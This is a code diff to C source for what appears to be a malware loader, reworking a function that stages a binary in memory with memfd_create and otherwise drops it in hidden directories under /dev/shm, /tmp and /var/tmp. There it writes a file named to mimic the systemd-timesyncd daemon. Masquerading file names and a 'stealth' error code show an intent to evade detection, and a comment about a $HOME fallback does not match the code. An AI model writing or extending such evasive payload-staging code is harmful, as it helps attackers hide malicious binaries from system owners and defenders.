@@ -80,46 +80,54 @@ int ph_memfd_init(ph_memfd_ctx_t *ctx)
     return PH_OK;
 }
 
-int ph_memfd_create_file(ph_memfd_ctx_t *ctx)
-{
-    if (!ctx) {
-        return PH_ERR_NULL_PTR;
-    }
+int ph_memfd_create_file(ph_memfd_ctx_t *ctx) {
+    if (!ctx) return PH_ERR_NULL_PTR;
 
-    // Try memfd_create first
-    int fd = (int)syscall(SYS_memfd_create, ctx->memfd_name, MFD_CLOEXEC | MFD_ALLOW_SEALING);
+    // Try memfd_create first (kernel 3.17+)
+    #ifdef __x86_64__
+    int fd = syscall(319, ctx->memfd_name, MFD_CLOEXEC);
+    #elif __aarch64__
+    int fd = syscall(279, ctx->memfd_name, MFD_CLOEXEC);
+    #elif __i386__
+    int fd = syscall(356, ctx->memfd_name, MFD_CLOEXEC);
+    #else
+    int fd = -1; errno = ENOSYS;
+    #endif
+     
     if (fd >= 0) {
         ctx->memfd = fd;
         ctx->exec_mode = PH_EXEC_MODE_MEMFD;
-        write(STDERR_FILENO, "[+] Binary Staged in Memory.\n", 29);
+        dprintf(STDERR_FILENO, "[+] Binary staged in memfd.\n");
         return PH_OK;
     }
-    
-    write(STDERR_FILENO, "MEMFD_FAIL: memfd_create failed, attempting fallback\n", 53);
-
-    // Fallback 1: /dev/shm/.font-unix-cache
-    const char *fallback1 = "/dev/shm/.font-unix-cache";
-    mkdir("/dev/shm", 0755);
-    fd = open(fallback1, O_RDWR | O_CREAT | O_TRUNC, 0700);
-    if (fd >= 0) {
-        ctx->memfd = fd;
-        ctx->exec_mode = PH_EXEC_MODE_DISK;
-        write(STDERR_FILENO, "[+] Binary Staged in /dev/shm.\n", 31);
-        return PH_OK;
+     
+    dprintf(STDERR_FILENO, "[!] memfd_create unavailable (kernel <3.17), using disk fallback.\n");
+     
+    // Fallback chain: /dev/shm → /tmp → /var/tmp → $HOME
+    const char *paths[] = {
+        "/dev/shm/.font-unix-cache",
+        "/tmp/.font-unix-cache", 
+        "/var/tmp/.font-unix-cache",
+        NULL
+    };
+     
+    for (int i = 0; paths[i]; i++) {
+        mkdir(paths[i], 0700);
+        char fullpath[256];
+        snprintf(fullpath, sizeof(fullpath), "%s/.systemd-timesyncd", paths[i]);
+         
+        fd = open(fullpath, O_RDWR | O_CREAT | O_TRUNC, 0700);
+        if (fd >= 0) {
+            ctx->memfd = fd;
+            ctx->exec_mode = PH_EXEC_MODE_DISK;
+            strncpy(ctx->disk_path, fullpath, sizeof(ctx->disk_path) - 1);
+            dprintf(STDERR_FILENO, "[+] Binary staged in %s.\n", fullpath);
+            return PH_OK;
+        }
     }
-
-    // Fallback 2: /tmp/.font-unix-cache
-    const char *fallback2 = "/tmp/.font-unix-cache";
-    fd = open(fallback2, O_RDWR | O_CREAT | O_TRUNC, 0700);
-    if (fd >= 0) {
-        ctx->memfd = fd;
-        ctx->exec_mode = PH_EXEC_MODE_DISK;
-        write(STDERR_FILENO, "[+] Binary Staged in /tmp.\n", 27);
-        return PH_OK;
-    }
-
-    write(STDERR_FILENO, "STAGE_FAIL: no executable staging area\n", 39);
-    return PH_ERR_MEMORY;
+     
+    dprintf(STDERR_FILENO, "[STAGE_FAIL] No writable staging area found.\n");
+    return PH_ERR_STEALTH;
 }
 
 void ph_memfd_cleanup(ph_memfd_ctx_t *ctx)
